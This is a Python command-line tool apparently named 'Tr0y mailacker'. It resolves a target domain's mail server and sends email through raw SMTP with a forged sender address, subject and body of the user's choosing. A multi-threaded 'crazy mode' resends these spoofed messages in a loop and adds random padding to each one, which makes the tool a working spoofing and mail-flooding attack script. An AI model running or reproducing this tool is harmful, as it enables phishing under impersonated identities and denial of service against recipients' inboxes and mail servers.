# -*- coding: utf-8 -*-
import socket
from time import sleep
import random
import threading
import dns.resolver
import argparse
import signal
import sys
import string
import os


class FakeEmail:
    def __init__(self, to_addr, from_addr, SMTP_addr, port=25, timeout=10):
        Print(u"check config", sign=u"[+]")
        Print(u"to address: "+to_addr)
        Print(u"from address: "+from_addr)
        Print(u"SMTP address: "+SMTP_addr)
        Print(u"SMTP port: "+str(port))
        Print(u"socket timeout: "+str(timeout))
        Print(u"verbose level: "+str(verbose))
        Print(u"no problem, maybe", sign=u"  [*]")

        self.to_addr = to_addr
        self.from_addr = from_addr
        self.port = port
        self.timeout = timeout
        self.SMTP_addr = SMTP_addr
        self.quit_flag = 1
        self.succ_num = 0
        self.failed_num = 0
        self.msg = PutColor("Connecting...", "yellow")

    def Connect(self):
        self.sk = socket.socket()
        self.sk.settimeout(self.timeout)

        try:
            Print(u"connect to %s:%s " % (self.SMTP_addr, str(self.port)), sign=u"[+]")
            self.sk.connect((self.SMTP_addr, self.port))
        except Exception as e:
            return (0, str(e))

        return self.Recv(check=u"220")

    def Send(self, msg):
        for result in msg.split(u"\r\n"):
            try:
                self.sk.sendall((result+u"\r\n").encode("utf8"))
                Print(result, threshold=2, color=u"yellow", sign=u"=> ")
            except Exception as e:
                Print(str(e), threshold=0, color=u"red", sign=u"=> ", id=self.id)
                return 0
        return 1

    def Recv(self, check=u"", threshold=2):
        try:
            data = [i.decode(u"utf8") for i in self.sk.recv(1024).split(b"\r\n") if i]
            assert data
        except AssertionError:
            if not check:
                Print(u"recv empty answer", threshold=0, color=u"red", sign=u"<= ", id=self.id)
            return (0, u"recv empty answer")
        except Exception as e:
            if not check:
                Print(str(e), threshold=0, color=u"red", sign=u"<= ", id=self.id)

            return (0, str(e))

        if check and check not in data[-1]:
            self.msg = data[-1]
            return (0, data[-1])

        if any([i for i in range(400, 600) if data[-1][:3] == str(i)]):
            Print(data[-1], threshold=0, color=u"red", sign=u"<= ", id=self.id)
            return (0, data[-1])

        for result in data:
            Print(result, threshold=threshold, color=u"green", sign=u"<= ")

        return (1, data[-1])

    def Attack(self, id):
        global succ_num, failed_num, quit_flag, threads_alive, Data

        self.id = id
        while quit_flag and self.quit_flag:
            check_connect = self.Connect()
            if not check_connect[0]:
                Print(u"creating connection failed: "+u"I just got the answer: '%s' from %s" % (check_connect[1], self.SMTP_addr),
                      threshold=0, color=u"red", sign=u"[X]", flag=0, id=self.id)
                self.sk.close()
                # failed_num += 1
                # self.failed_num += 1
                if crazy_mode:
                    continue
                else:
                    break

            Print(u"now, all ready", sign=u"  [*]")
            Print(u"using spam attack", sign=u"[+]")
            if not (self.Send(u"ehlo antispam") and self.Recv(check="220")[0]):
                failed_num += 1
                self.failed_num += 1
                if crazy_mode:
                    #self.msg = PutColor("ehlo failed")
                    continue
                else:
                    break

            while quit_flag and self.quit_flag:
                if not (self.Send(u"mail from:<%s>" % self.from_addr) and self.Recv()[0]) or\
                        not (self.Send(u"rcpt to:<%s>" % self.to_addr) and self.Recv()[0]) or\
                        not (self.Send(u"data") and self.Recv()[0]):

                    failed_num += 1
                    self.failed_num += 1
                    if not crazy_mode:
                        self.quit_flag = 0

                    break

                if self.Send(u"to: %s" % self.to_addr) and\
                        self.Send(u"from: %s" % self.from_addr) and\
                        self.Send("subject: "+subject) and\
                        self.Send(u"") and\
                        self.Send(body+u"\r\n\r\n????????????????????????"+"".join(random.choice(string.hexdigits) for i in range(32))+"\r\n.\r\n"):

                    result = self.Recv(threshold=0, check=u"250")
                    if result[0]:
                        succ_num += 1
                        self.succ_num += 1
                        self.msg = PutColor(self.succ_num, "cyan")
                    else:
                        self.msg = PutColor(result[1], "red")
                        # Print(, threshold=0, color=u"red", sign=u"<= ", id=self.id)
                        failed_num += 1
                        self.failed_num += 1
                else:
                    failed_num += 1
                    self.failed_num += 1
                    break

                if not crazy_mode:
                    self.quit_flag = 0
                else:
                    sleep(random.random()*1.5)

        Print(u"all done", sign=u"  [*]")
        threads_alive[id] = 0
        return self.sk.close()


def PutColor(string, color):
    colors = {
        u"gray": "2",
        u"red": "31",
        u"green": "32",
        u"yellow": "33",
        u"blue": "34",
        u"pink": "35",
        u"cyan": "36",
        u"white": "37",
    }

    return u"\033[40;1;%s;40m%s\033[0m" % (colors[color], string)


def superPrint():
    Lock.acquire()

    _, fixed_length = os.popen('stty size', 'r').read().split()
    fixed_length = int(fixed_length)
    for index in Indicator("attacking..."):
        for i, data in enumerate(Data):
            try:
                _, length = os.popen('stty size', 'r').read().split()
            except:
                pass
            length = int(length)
            if fixed_length > length:
                show_logo()
                fixed_length = length

            print("\033[K\r[%5.1f%%] %s%s" % (
                100.0*data.succ_num/(data.succ_num+data.failed_num+1e-10),
                PutColor("No.%d: " % i, "white"),
                data.msg if len(data.msg) < length else data.msg[:length-8]+"...\033[0m"))

        print("\r\033[K"+PutColor("[%5.1f%%] %s" % (
            100*succ_num/(failed_num+succ_num+1e-10),
            "[%d]" % succ_num), "green"
        ))

        print(PutColor("\r\033[K[%d]" % succ_num, "green")+PutColor(index, "white")+"\033[1A")
        print("\033[%dA" % (len(Data)+2))
        sleep(0.05)

    for i, data in enumerate(Data):
        print("\033[K\r[%5.1f%%] %s%s" % (
            100.0*data.succ_num/(data.succ_num+data.failed_num+1e-10),
            PutColor("No.%d: " % i, "white"),
            data.msg if len(data.msg) < length else data.msg[:length-8]+"...\033[0m"))
    print("\r\033[K"+PutColor("[%5.1f%%] %s" % (
        100*succ_num/(failed_num+succ_num+1e-10),
        "[%d]" % succ_num), "green"
    ))
    if crazy_mode != 1:
        print("")
    Lock.release()


def Print(string, threshold=3, color=u"gray", sign=u"  [-]", flag=1, id=-1):
    global Data

    if verbose < threshold or (verbose == 0 and threshold > -1):
        return

    str_color = u"gray" if color == u"gray" else u"white"

    string = PutColor(sign, color)+PutColor(string, str_color)
    if verbose > 2 and threshold < 3 and flag:
        string = "  [-]"+string

    if Lock.acquire():
        print("\r"+string)
        Lock.release()


def DNSQuery(to_addr):
    resolver = dns.resolver.Resolver()
    resolver.timeout = 3
    resolver.lifetime = 3

    Print(u"query MX of DNS for %s" % to_addr, sign=u"[+]")

    try:
        SMTP_addr = b'.'.join(dns.resolver.query(
            to_addr[to_addr.find(u"@")+1:], u'MX')[0].exchange.labels).decode(u"utf8")
        assert SMTP_addr != u""
    except Exception as e:
        Print(u"query MX of %s failed: " % to_addr + str(e),
              threshold=0, color=u"red", sign=u"[X]", flag=0)
        return 0

    Print(u"success", sign=u"  [*]")
    return SMTP_addr


def Launcher():
    global Data

    if not verbose:
        threading.Thread(target=superPrint).start()

    threads = []
    for id in range(threads_num):
        client = FakeEmail(to_addr, from_addr, SMTP_addr=SMTP_addr)
        t = threading.Thread(target=client.Attack, args=(id,))
        t.start()
        threads.append(t)
        Data.append(client)

    if not crazy_mode:
        for t in threads:
            t.join()
    else:
        for i in Indicator("attacking..."):
            Print(i+"\033[1A", color="green", threshold=0, flag=0, sign="\033[K[%d]" % succ_num)
            sleep(0.1)


def Indicator(string, index=0):
    while any(threads_alive) and ver == "go" and print_flag:
        index = (index+1) % len(string)
        yield string[:index]+string[index].upper()+string[index+1:]+["|", "/", "-", "\\"][index % 4]


def quit(signum, frame):
    global quit_flag, print_flag

    signal.signal(signal.SIGINT, lambda a, b: None)

    print_flag = 0

    Lock.acquire()
    Lock.release()

    print_flag = 1
    quit_flag = 0

    for i in Indicator("stopping..."):
        Print(i+"\033[1A", color="yellow", threshold=-1, flag=0, sign="\033[K[!]")
        sleep(0.1)

    Print(u"%s %s" % (u"success:", succ_num), threshold=-1,
          color=u"green", flag=0, sign="\n"*(crazy_mode == True)+"\n[*]")
    Print(u"%s %s\n" % (u"failed:", failed_num), threshold=-1, color=u"red", flag=0, sign="[!]")

    sys.exit("\033[?25h"+PutColor(random.choice([
        u"Goodbye", u"Have a nice day", u"See you later",
        u"Farewell", u"Cheerio", u"Bye",
    ])+" :)", u"white"))


def show_logo():
    print("\033c\033[?25l")
    os.system("""/usr/bin/osascript -e 'tell application "System Events" to tell process "Terminal" to keystroke "k" using command down'""")
    print("""
\033[40;1;40m ????????????????????????     ?????????  ?????????\033[0m
\033[40;1;40m ????????????????????????     ?????????  ????????? \033[40;1;33;40mTr0y\033[0m\033[0m
\033[40;1;40m ??????????????????       ???????????????????????? \033[0m
\033[40;1;40m ??????????????????       ???????????????????????? \033[40;1;33;40mv2.0\033[0m\033[0m
\033[40;1;40m ????????????????????????     ?????????  ?????????\033[0m
 ????????????????????????\033[40;1;32;40mmail\033[0m ?????????  ?????????\033[40;1;32;40macker\033[0m
""")


signal.signal(signal.SIGINT, quit)
signal.signal(signal.SIGTERM, quit)
parser = argparse.ArgumentParser()
parser.add_argument(u"-faddr", u"--from_address",
                    help=u"fake-from-address", required=True)

parser.add_argument(u"-taddr", u"--to_address",
                    help=u"the address you want to delivery", required=True)

parser.add_argument(u"-s", u"--subject",
                    help=u"email's subject", required=True)

parser.add_argument(u"-b", u"--body",
                    help=u"email's body(content)", required=True)

parser.add_argument(u"-tnum", u"--threads_num",
                    help=u"how many threads you want (default is 1)", default=1, type=int)

parser.add_argument(u"-v", u"--verbose",
                    help=u"verbose level (choice in [0, 1, 2, 3])", default=-1, type=int)

parser.add_argument(u"-c", u"--crazy_mode",
                    help=u"Keep sending fake-email (default is False ** Use with caution **)", action='store_true', default=False)


args = parser.parse_args()

show_logo()
succ_num = failed_num = 0
quit_flag = print_flag = 1
ver = -1
from_addr = args.from_address
to_addr = args.to_address
subject = args.subject.decode("utf8") if vars(str).get("decode") else args.subject
body = (args.body.decode(
    "utf8") if vars(str).get("decode") else args.body).replace("\\n", "\r\n")
threads_num = args.threads_num if args.threads_num > 0 else 1
verbose = args.verbose
crazy_mode = args.crazy_mode
threads_alive = [1]*threads_num
Data = []
Lock = threading.Lock()

if verbose == -1:
    verbose = 0 if crazy_mode else 2 if threads_num == 1 else 1

elif threads_num > 1:
    if crazy_mode and verbose > 1:
        ver = 0
        Print(u"""...It's not recommended to enable so many output(let verbose>0)
...in the multi-threaded mode with crazy mode,
...change it to 0? (let verbose=0)""",
              color=u"yellow", threshold=0, sign=u"[!]WARNING: \n", flag=0)
    elif verbose > 1:
        ver = 1
        Print(u"""...It's not recommended to enable so many output(let verbose>1)
...in the multi-threaded mode,
...change it to 1? (let verbose=1)""",
              color=u"yellow", threshold=0, sign=u"[!]WARNING: \n", flag=0)

if ver != -1:
    if vars(__builtins__).get('raw_input', input)(PutColor(u"[!]", "yellow")+PutColor("type [yes]/no: ", "white")) != "no":
        verbose = ver
        Print(u"as you wish\n", color=u"green", threshold=0, sign=u"[*]", flag=0)
    else:
        Print(u"in a mess, of course\n", color=u"yellow", threshold=0, sign=u"[!]", flag=0)

SMTP_addr = DNSQuery(to_addr)
if SMTP_addr:
    ver = "go"
    Launcher()
else:
    threads_alive = [0]

quit(0, 0)
